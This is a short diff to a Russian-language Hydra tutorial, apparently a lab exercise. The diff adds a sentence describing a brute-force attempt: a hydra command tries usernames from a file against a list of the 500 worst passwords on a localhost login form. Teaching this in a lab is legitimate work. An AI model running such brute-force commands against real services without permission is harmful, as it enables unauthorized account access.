@@ -10,7 +10,7 @@ Hydra - популярный инструмент, используемый пр
 hydra -h
 ```
 
-
+Пробуем проверить пароли пользователей, указанных в `~/project/usernames.txt` и распространенных паролей, указанных в `~/project/500-worst-passwords.txt`
 
 ```shell
 hydra -L ~/project/usernames.txt -P ~/project/500-worst-passwords.txt localhost -s 8080 http-post-form "/:username=^USER^&password=^PASS^:Invalid username or password" -o ~/project/hydra_results.txt
